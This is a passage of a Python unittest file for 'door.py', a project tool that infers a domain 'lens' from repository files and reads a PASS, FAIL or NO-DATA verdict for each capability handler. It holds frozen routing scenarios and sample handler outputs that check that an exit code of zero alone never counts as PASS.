        self.assertEqual(record["lens_inferred"]["lens"], "data-science")
        matched = record["lens_inferred"]["matched_paths"]
        self.assertTrue(any(p.endswith(".ipynb") for p in matched), matched)
        self.assertTrue(any("mlruns" in p for p in matched), matched)

    def test_a_plain_tree_infers_no_lens(self):
        repo = tempfile.mkdtemp(prefix="door-lens-none-repo-")
        with open(os.path.join(repo, "readme.txt"), "w",
                 encoding="utf-8") as fh:
            fh.write("hello\n")

        record = self._run_door_in(repo)
        self.assertIsNone(record["lens_inferred"])


class FrozenPromptSetRouteCorrectness(unittest.TestCase):
    """WBS-10.01's own gate (~/Downloads/BROTHER_1.0.17_CONVERGENCE_ROADMAP_
    2026-09-14.md line 798): "Frozen prompt set proves route correctness."

    door.py's own routing is tree-signal based, never a parse of the
    outcome text (infer_lenses(root, listed_files, ...) takes no outcome
    argument; see its docstring's "one-visible-Brother rule": no match
    asks no question and states no assumption, rather than guessing). So a
    frozen SCENARIO here pins both halves of one request: the outcome
    sentence a person would actually type (documentation, not a routing
    input) and the repository tree door.py actually routes on. The outcome
    text is carried so a reviewer can see the scenario is a real one, not
    grep for it.

    PINNED, for every scenario, run through the real door.py subprocess
    exactly as LensInferenceEndToEnd does above:

      1. lens_inferred matches the frozen expectation exactly (a plain
         "add retry/backoff and test it" tree infers nothing at all, which
         is what keeps door from exposing a pack's taxonomy or reciting a
         menu for ordinary work; a tree carrying a real domain signal still
         infers its pack, so the router is proven to discriminate, not to
         have gone silent everywhere);
      2. pending_challenge is None on every plain-tree scenario: no extra
         question is ever surfaced for ordinary reversible work (roadmap's
         "Do not: recite a menu");
      3. running the SAME scenario twice, into two independent stores,
         gives BYTE-IDENTICAL lens_inferred and pending_challenge: the
         route is a property of the tree, not of run order or timing.
    """

    #: (name, outcome, {relative_path: content}, expected_lens_or_None)
    #: The outcome text mirrors the roadmap's own worked example
    #: (line 776) plus three siblings of the same shape: an ordinary,
    #: reversible, single-repository coding request with no domain
    #: manifests, decision records, dashboards, or infrastructure files.
    #: One positive control (a migrations/ directory, backend-senior's own
    #: signal, distinct from architect's openapi.yaml/openapi.yml/
    #: openapi.json path signals so it cannot lose a specificity tie to a
    #: sibling pack) proves the frozen set is not pinning "always None": a
    #: real backend-senior signal still fires.
    SCENARIOS = (
        ("retry_backoff",
         "add retry/backoff to this API client and test it",
         {"client.py": "class Client:\n    pass\n",
          "test_client.py": "def test_client():\n    pass\n"},
         None),
        ("readme_typo",
         "fix the typo in the README",
         {"README.md": "# Proejct\n"},
         None),
        ("parser_unit_test",
         "add a unit test for the date parser",
         {"parser.py": "def parse(s):\n    return s\n",
          "test_parser.py": "def test_parse():\n    pass\n"},
         None),
        ("migrations_control",
         "add a new endpoint to this service",
         {"migrations/0001_init.py": "# initial migration\n"},
         "backend-senior"),
    )

    def _run_once(self, repo, outcome):
        stub_tmp = tempfile.mkdtemp(prefix="door-frozen-stub-")
        stub = os.path.join(stub_tmp, "stub.py")
        _stub_that_writes_one_unit(stub)
        store = tempfile.mkdtemp(prefix="door-frozen-store-")
        proc = subprocess.run(
            [sys.executable, DOOR, outcome,
             "--model-cmd", "%s %s" % (shlex.quote(sys.executable), shlex.quote(stub)),
             "--store", store],
            capture_output=True, text=True, timeout=60, cwd=repo)
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        files = [f for f in os.listdir(store) if f.endswith(".json")]
        self.assertEqual(len(files), 1)
        with open(os.path.join(store, files[0]), encoding="utf-8") as fh:
            return json.load(fh)

    def test_frozen_scenarios_route_correctly_and_stably(self):
        for name, outcome, tree, expected_lens in self.SCENARIOS:
            with self.subTest(scenario=name):
                repo = tempfile.mkdtemp(prefix="door-frozen-repo-%s-" % name)
                for rel, content in tree.items():
                    path = os.path.join(repo, rel)
                    os.makedirs(os.path.dirname(path) or repo, exist_ok=True)
                    with open(path, "w", encoding="utf-8") as fh:
                        fh.write(content)

                first = self._run_once(repo, outcome)
                second = self._run_once(repo, outcome)

                first_lens = (first["lens_inferred"] or {}).get("lens")
                second_lens = (second["lens_inferred"] or {}).get("lens")
                self.assertEqual(
                    first_lens, expected_lens,
                    "%s: expected lens %r, got %r" % (name, expected_lens, first_lens))
                self.assertEqual(
                    first_lens, second_lens,
                    "%s: lens drifted between two runs of the identical "
                    "tree: %r then %r" % (name, first_lens, second_lens))

                if expected_lens is None:
                    self.assertIsNone(
                        first["pending_challenge"],
                        "%s: a plain tree must never surface a pending "
                        "challenge question" % name)
                    self.assertIsNone(second["pending_challenge"])


# ---------------------------------------------------------------------------
# VERD1.a: one verdict contract at the capability door. A capability's verdict
# comes from its OWN evidence: PASS only when its own check passed, FAIL when it
# contradicts, NO-DATA when no verdict was produced. A child exit code 0 alone is
# never PASS. Every case isolates one adapter and one input shape, and the
# handler cases first assert the scripted child really ran, so a refusal that
# fires before the reader can never pass them by accident.
# ---------------------------------------------------------------------------
import importlib.util as _v1_importlib_util  # noqa: E402
from unittest import mock as _v1_mock  # noqa: E402

_V1_ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(_V1_ROOT, "products", "brothersbe", "src"))
sys.path.insert(0, os.path.join(_V1_ROOT, "products", "brotherds"))
from brothersbe import cli as _v1_sbe  # noqa: E402


def _v1_load(name, *parts):
    spec = _v1_importlib_util.spec_from_file_location(name, os.path.join(_V1_ROOT, *parts))
    mod = _v1_importlib_util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


_v1_bds = _v1_load("bds_for_verd1a", "products", "brotherds", "bds.py")
_v1_vault = _v1_load("bm_vault_for_verd1a", "products", "brothermode", "tools", "bm_vault.py")

#: exit 0 text that carries no verdict word and none of any handler's own evidence
V1_JUNK = "Completed. Nothing further to report.\n"
V1_STRICT_ROW = _v1_sbe.DOOR_HANDLERS["assurance_existing_review"]
V1_REPORT_ROW = _v1_sbe.DOOR_HANDLERS["assurance_existing_status"]
import mdm_normalize as _v1_norm  # noqa: E402

_V1_HIT = ("What this estate has already written about that:\n\n  lesson  [lesson, vault]\n"
           "    id: n-00000000000000aa  authority: casual  temporal: timeless_current\n"
           "    verified: unknown (no verified_at on record)\n    matched on: wording\n"
           "    /vault/10-Lessons/lesson.md\nevent: f812d033fdee4f699b6eaf9a9c25659c\n")
#: what each handler's REAL command prints when it succeeded (captured 2026-11-01 over scratch inputs unless a
#: comment says the shape was read from the printing line instead). Evidence marker -> printing line:
V1_BDS_SUCCESS = {
    # bds.py:661 print("registered %r from claim %s in %s")
    "data_existing_register": "registered 'weekly_orders' from claim C1 in /w/metric-registry.json\n",
    # bds.py:2778 print("OUTCOME %s" % state), HELD or MISSED
    "data_existing_score": ("claim   C2\n        Weekly orders\n\n  recorded  500\n  actual    500\n"
                            "  observed  today by me\n\nOUTCOME HELD\n        actual 500 fell inside the band\n"
                            "lesson candidate: NO-DATA: vault not configured\n"),
    # mdm_eval.py:901 JSON carrying precision_above and recall
    "data_existing_mdm_review": json.dumps({"merge_threshold": 0.9, "n_rows": 400, "precision_above": {
        "estimate": 0.98, "lo": 0.94, "hi": 0.99}, "recall": {"recall": 0.56}, "strata": []}, indent=2) + "\n",
    # mdm_derive.py:186 JSON carrying gold_clusters and pairwise
    "data_existing_mdm_clusters": json.dumps({"bcubed": {"f1": 0.85}, "gold_clusters": {"pred": [["r1"]], "true": [
        ["r1"]]}, "n_records": 4, "pairwise": {"f1": 0.66, "tp": 1}}, indent=2) + "\n",
    # mdm_derive.py:186 JSON carrying psi and score_drift
    "data_existing_mdm_drift": json.dumps({"band": "major", "bins": 10, "n_current": 3, "n_reference": 3,
                                           "psi": 16.9, "score_drift": {"current": [0.1], "reference": [0.1]}},
                                          indent=2) + "\n",
    # mdm_audit.py:712,727 JSON carrying input_sha256 and n_rows
    "data_existing_mdm_audit": json.dumps({"collisions": {}, "input_sha256": "ab" * 32, "n_rows": 40}, indent=1) + "\n",
    # mdm_audit.py:717,727 the same plus review_plan
    "data_existing_mdm_audit_plan": json.dumps({"input_sha256": "ab" * 32, "n_rows": 40, "review_plan": {
        "schema": "brotherds.audit-plan.v1", "algorithm": "stratified-random-v1", "input_sha256": "ab" * 32,
        "input_encoding": "utf-8", "parameters": {"margin": 0.1, "min_n": 10, "max_n": 400, "seed": 7},
        "columns": ["plan_id", "stratum", "source_id", "reference_id", "pathway", "score", "verifier",
                    "stratum_population", "stratum_sampled", "label"],
        "row_count": 32, "plan_sha256": "cd" * 32}}, indent=1) + "\n",
    # mdm_audit.py:775 JSON carrying strata and pathway_review
    "data_existing_mdm_evaluate": json.dumps({"pathway_review": {}, "strata": [], "unlabelled": 0,
                                              "unmatched_review": {}, "verifier": {}}, indent=1) + "\n",
    # mdm_jan_lookup.py:229
    "data_existing_mdm_resolve": "wrote 2 rows to o.csv (1 resolved without web research)\n",
    # mdm_jan_lookup.py:237 one JSON line per name
    "data_existing_mdm_classify": json.dumps({"name": "Cola 500ml PET", "packaging_type": "loose", "reason": "r"},
                                             ensure_ascii=False) + "\n",
}
V1_VAULT_SUCCESS = {
    # bm_vault.py:2592 (id line) and its path line, under _print_hits' heading at bm_vault.py:3379
    "vault_existing_recall": _V1_HIT,
    # the same hit block under bm_vault.py:3848's heading
    "vault_existing_context_recall": _V1_HIT.replace("What this estate has already written about that:",
                                                     "RECORDED FAILURES in the files you are about to touch:"),
    # bm_vault.py:3978 notes line (one indexed) and the last indexed line
    "vault_existing_status": ("index: /c/bm_vault_index.sqlite3\nnotes: 1 (vault 1)\nanchors: 0 distinct file or "
                              "symbol names; links: 0; dense vectors: 0 of 1\nlast indexed: 0.0 hours ago\n"),
    # bm_vault_intake.py:878
    "vault_existing_capture": ("CAPTURED 00-Inbox/run-the-kernel-check-first-daf04068.md  id=n-4ff45bc0daf04068  "
                               "expiry=2026-12-01 (lesson-candidate)\nVault saved: Run the kernel check first.\n"),
    # bm_vault_promotions.py:173-174, a real state
    "vault_existing_review": "note: 10-Lessons/lesson.md\nstate: candidate\n",
    # bm_vault_lifecycle.py:368-369 and the tallies, no FINDINGS line
    "vault_existing_lifecycle": ("vault: /v\nnotes: 2\n  canonical    0\n  validated    0\n  under_review 0\n"
                                 "  candidate    2\n  rejected     0\n  revoked      0\n  expired      0\n"
                                 "  legacy       0  (predates the contract; in retrieval, never canonical)\n"),
    # bm_vault_promotions.py:242 with --apply
    "vault_existing_promote": "promoted 10-Lessons/lesson.md: candidate -> validated\n",
    # bm_vault_attribute_provenance.py:312-314 (read from the printing lines)
    "vault_existing_provenance": ("provenance history for 10-Lessons/lesson.md / promotion (1 version(s)):\n"
                                  "  v1 [verified] source=door set_at=2026-11-01 checked_by=bob promoted_by=bob\n"),
    # bm_vault_asof.py:165-167
    "vault_existing_asof": ("vault: /v\nas of: 2026-11-01\nnotes: 2 total\n"
                            "in truth, resting on a declared interval: 0\n"),
    # bm_vault_retention.py:285 and :291
    "vault_existing_retention": ("census: 1 file-backed note(s) indexed, 0 stale, 0 correction-rule row(s) skipped\n"
                                 "clean: every indexed note is present and unrevoked on disk\n"),
}


class VerdictContract(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, True)
        home = os.path.join(self.tmp, "home")  # an empty HOME: nothing on this laptop can speak for the work
        os.makedirs(home)
        patch = _v1_mock.patch.dict(os.environ, {"HOME": home})
        patch.start()
        self.addCleanup(patch.stop)

    # -- BrotherSBE _door_verdict ------------------------------------------------------------------------------
    def test_sbe_exit_zero_with_no_verdict_word_is_no_data(self):
        for row in (V1_STRICT_ROW, V1_REPORT_ROW):
            verdict, _ = _v1_sbe._door_verdict(row, 0, V1_JUNK, "")
            self.assertEqual("NO-DATA", verdict, row["verb"])

    def test_sbe_non_strict_pass_line_beside_a_no_data_line_is_no_data(self):
        verdict, _ = _v1_sbe._door_verdict(V1_REPORT_ROW, 0, "PASS gate one\nNO-DATA gate two\n", "")
        self.assertEqual("NO-DATA", verdict)

    def test_sbe_strict_pass_line_beside_a_no_data_line_is_no_data(self):  # control: already true today
        verdict, _ = _v1_sbe._door_verdict(V1_STRICT_ROW, 0, "PASS gate one\nNO-DATA gate two\n", "")
        self.assertEqual("NO-DATA", verdict)

    def test_sbe_exit_zero_with_a_real_pass_line_is_pass(self):  # control: the fix must not turn everything NO-DATA
        for row in (V1_STRICT_ROW, V1_REPORT_ROW):
            verdict, _ = _v1_sbe._door_verdict(row, 0, "PASS gate migration\n", "")
            self.assertEqual("PASS", verdict, row["verb"])

    def test_sbe_a_fail_line_beside_exit_zero_is_fail(self):  # control
        for row in (V1_STRICT_ROW, V1_REPORT_ROW):
            verdict, _ = _v1_sbe._door_verdict(row, 0, "PASS gate one\nFAIL gate two\n", "")
            self.assertEqual("FAIL", verdict, row["verb"])

    def test_sbe_door_invoke_end_to_end_exit_zero_with_no_verdict_word_carries_no_pass(self):
        got = _v1_sbe.door_invoke("assurance_existing_status", {"path": self.tmp},
                                  lambda argv, cwd: (0, V1_JUNK, ""))
        self.assertEqual(("NO-DATA", []), (got["verdict"], got["evidence_refs"]))

    # -- BrotherDS door_invoke ---------------------------------------------------------------------------------
    def _bds_inputs(self, handler):
        path = os.path.join(self.tmp, "f.csv")
        with open(path, "w") as fh:
            fh.write("a\n")
        by_key = {"claim": {"id": "C1"}, "actual": 1, "merge_threshold": 1, "inputs": [path], "names": ["x"],
                  "values": ["x"], "kind": "x", "locale": "ja", "text": "x", "dest": "d.json", "plan": "p.json",
                  "out": "o.json"}
        required = _v1_bds.DOOR_HANDLERS[handler][2]
        return {k: by_key.get(k, path) for k in required}

    def _bds_run(self, handler, out, inputs=None):
        calls = []

        def run(argv, stdin_text):
            calls.append(argv)
            return 0, out, ""
        with _v1_mock.patch.object(_v1_bds, "_door_consented", return_value=True), \
                _v1_mock.patch.object(_v1_bds, "_door_tool_present", return_value=True):
            got = _v1_bds.door_invoke(handler, inputs or self._bds_inputs(handler), run)
        self.assertEqual(1, len(calls), "the scripted child must run, or the reader was never reached")
        return got

    def test_bds_a_verdict_line_handler_with_no_verdict_line_is_no_data(self):  # control: reader is sound
        self.assertEqual("NO-DATA", self._bds_run("data_existing_check", V1_JUNK)["verdict"])

    def test_bds_a_verdict_line_handler_with_its_own_pass_line_is_pass(self):  # control
        got = self._bds_run("data_existing_check", "VERDICT PASS\n")
        self.assertEqual(("PASS", 1), (got["verdict"], len(got["evidence_refs"])))

    def test_bds_the_ledger_with_a_rate_is_pass(self):  # control
        self.assertEqual("PASS", self._bds_run("data_existing_ledger", "VERIFIED CLAIM RATE  80%\n")["verdict"])

    # -- BrotherMode Vault door_invoke -------------------------------------------------------------------------
    def _vault_run(self, handler, out):
        by_key = {"query": "q", "paths": ["a.md"], "text": "t", "by": "b", "id": "i", "to": "t", "note": "n",
                  "attribute": "a", "date": "2026-01-01"}
        required = _v1_vault.DOOR_HANDLERS[handler][2]
        calls = []

        def run(argv):
            calls.append(argv)
            return 0, out, ""
        with _v1_mock.patch.object(_v1_vault, "_consented", return_value=True), \
                _v1_mock.patch.object(_v1_vault, "resolve_vault_root",
                                      return_value={"verdict": "PASS", "root": self.tmp, "detail": ""}):
            got = _v1_vault.door_invoke(handler, {k: by_key[k] for k in required}, run)
        self.assertEqual(1, len(calls), "the scripted child must run, or the reader was never reached")
        return got

    # -- positive evidence: a handler earns PASS only from its OWN success shape --------------------------------
    def test_bds_a_normalizer_key_equal_to_the_real_key_for_the_inputs_is_pass(self):
        text = "株式会社テスト商事"
        got = self._bds_run("data_existing_mdm_normalize", _v1_norm.company_key(text, "ja") + "\n",
                            {"kind": "company", "locale": "ja", "text": text})
        self.assertEqual(("PASS", 1), (got["verdict"], len(got["evidence_refs"])))

    def test_bds_a_normalizer_key_that_is_not_the_real_key_for_the_inputs_is_not_pass(self):
        text = "株式会社テスト商事"
        got = self._bds_run("data_existing_mdm_normalize", "some other key\n",
                            {"kind": "company", "locale": "ja", "text": text})
        self.assertNotEqual("PASS", got["verdict"])

    def test_bds_validate_with_a_valid_true_row_is_pass(self):  # control: the real shape of mdm_validate.py:489
        out = '{"jan_prefix": true, "kind": "GTIN-13", "normalized": "4901234567894", "reason": "ok", "valid": true}\n'
        self.assertEqual("PASS", self._bds_run("data_existing_mdm_validate", out)["verdict"])

    def test_bds_validate_with_a_valid_false_row_is_fail(self):  # control
        out = '{"kind": null, "normalized": "1234", "reason": "not a GTIN length", "valid": false}\n'
        self.assertEqual("FAIL", self._bds_run("data_existing_mdm_validate", out)["verdict"])

    def test_bds_score_that_graded_nothing_is_not_pass(self):
        out = "claim   C2\n\n  actual    5\n\nOUTCOME UNSCOREABLE\n        no interval was stated\n"
        self.assertNotEqual("PASS", self._bds_run("data_existing_score", out)["verdict"])

    def test_vault_promote_that_only_says_it_would_promote_is_not_pass(self):
        out = "would promote 10-Lessons/lesson.md: candidate -> validated\n"
        self.assertNotEqual("PASS", self._vault_run("vault_existing_promote", out)["verdict"])

    def test_vault_review_with_an_unknown_state_is_not_pass(self):
        out = "note: 10-Lessons/lesson.md\nstate: UNKNOWN\n"
        self.assertNotEqual("PASS", self._vault_run("vault_existing_review", out)["verdict"])

    def test_vault_status_of_an_empty_never_indexed_vault_is_not_pass(self):
        out = ("index: /c/bm_vault_index.sqlite3\nnotes: 0 (none)\nanchors: 0 distinct file or symbol names; "
               "links: 0; dense vectors: 0 of 0\nlast indexed: NEVER, run `bm_vault.py index` first\n")
        self.assertNotEqual("PASS", self._vault_run("vault_existing_status", out)["verdict"])

    # -- the retired reader ---------------------------------------------------------------------------------------
    def test_bds_no_handler_reads_its_verdict_with_the_produced_reader(self):
        self.assertEqual([], sorted(h for h, r in _v1_bds.DOOR_VERDICT_READERS.items() if r == "produced"))

    def test_vault_no_handler_reads_its_verdict_with_the_produced_reader(self):
        self.assertEqual([], sorted(h for h, r in _v1_vault.DOOR_VERDICT_READERS.items() if r == "produced"))

    # -- the Mobile route in door.py ---------------------------------------------------------------------------
    def test_mobile_exit_zero_with_unrelated_text_is_not_pass(self):
        rec = os.path.join(self.tmp, "rec.json")
        with open(rec, "w") as fh:
            fh.write("{}")
        calls = []

        def run(argv, timeout):
            calls.append(argv)
            return 0, V1_JUNK, ""
        got = door_mod.mobile_invoke("mobile_existing_journey", {"record": rec}, run)
        self.assertEqual(1, len(calls))
        self.assertNotEqual("PASS", got["verdict"])

    def test_mobile_the_journey_contracts_own_pass_line_is_pass(self):  # mobile_journey_contract.py:85
        rec = os.path.join(self.tmp, "rec.json")
        with open(rec, "w") as fh:
            fh.write("{}")
        out = "PASS: %s validates as mobile-journey-contract-v1\n" % rec
        got = door_mod.mobile_invoke("mobile_existing_journey", {"record": rec}, lambda argv, timeout: (0, out, ""))
        self.assertEqual(("PASS", True), (got["verdict"], bool(got["evidence_refs"])))

    # -- invoke_capability itself --------------------------------------------------------------------------------
    def test_invoke_capability_a_pass_with_no_evidence_is_unproven_never_complete(self):  # control
        spec = {"id": "x", "handler": "h", "prerequisites": [], "required_authority": []}
        got = door_mod.invoke_capability(spec, {}, {"available": [], "authority": []},
                                         lambda h, i: {"verdict": "PASS", "output": "all good", "evidence_refs": []})
        self.assertEqual(("UNPROVEN", "PASS", []), (got["state"], got["verdict"], got["evidence_refs"]))

    def test_invoke_capability_a_reply_with_no_verdict_is_no_data_never_pass(self):  # control
        spec = {"id": "x", "handler": "h", "prerequisites": [], "required_authority": []}
        got = door_mod.invoke_capability(spec, {}, {"available": [], "authority": []},
                                         lambda h, i: {"output": "ok", "evidence_refs": ["e1"]})
        self.assertEqual(("NO-DATA", "NO-DATA"), (got["state"], got["verdict"]))


def _v1_add_case(cls, name, fn):
    fn.__name__ = name
    setattr(cls, name, fn)


def _v1_bds_case(handler):
    def case(self):
        got = self._bds_run(handler, V1_JUNK)
        self.assertNotEqual("PASS", got["verdict"], "%s read PASS on exit 0 with no evidence of its own" % handler)
        self.assertEqual([], got["evidence_refs"])
    return case


def _v1_vault_case(handler):
    def case(self):
        got = self._vault_run(handler, V1_JUNK)
        self.assertNotEqual("PASS", got["verdict"], "%s read PASS on exit 0 with no evidence of its own" % handler)
        self.assertEqual([], got["evidence_refs"])
    return case


def _v1_bds_positive(handler):
    def case(self):
        got = self._bds_run(handler, V1_BDS_SUCCESS[handler])
        self.assertEqual(("PASS", 1), (got["verdict"], len(got["evidence_refs"])),
                         "%s did not earn PASS from its own success shape" % handler)
    return case


def _v1_vault_positive(handler):
    def case(self):
        got = self._vault_run(handler, V1_VAULT_SUCCESS[handler])
        self.assertEqual(("PASS", 1), (got["verdict"], len(got["evidence_refs"])),
                         "%s did not earn PASS from its own success shape" % handler)
    return case


for _h in sorted(V1_BDS_SUCCESS):
    _v1_add_case(VerdictContract, "test_bds_%s_own_success_shape_is_pass" % _h, _v1_bds_positive(_h))
for _h in sorted(V1_VAULT_SUCCESS):
    _v1_add_case(VerdictContract, "test_vault_%s_own_success_shape_is_pass" % _h, _v1_vault_positive(_h))


for _h in sorted(_v1_bds.DOOR_VERDICT_READERS):
    _v1_add_case(VerdictContract, "test_bds_%s_exit_zero_without_its_own_evidence_is_not_pass" % _h, _v1_bds_case(_h))
for _h in sorted(_v1_vault.DOOR_VERDICT_READERS):
    _v1_add_case(VerdictContract, "test_vault_%s_exit_zero_without_its_own_evidence_is_not_pass" % _h,
                 _v1_vault_case(_h))


if __name__ == "__main__":
    unittest.main()
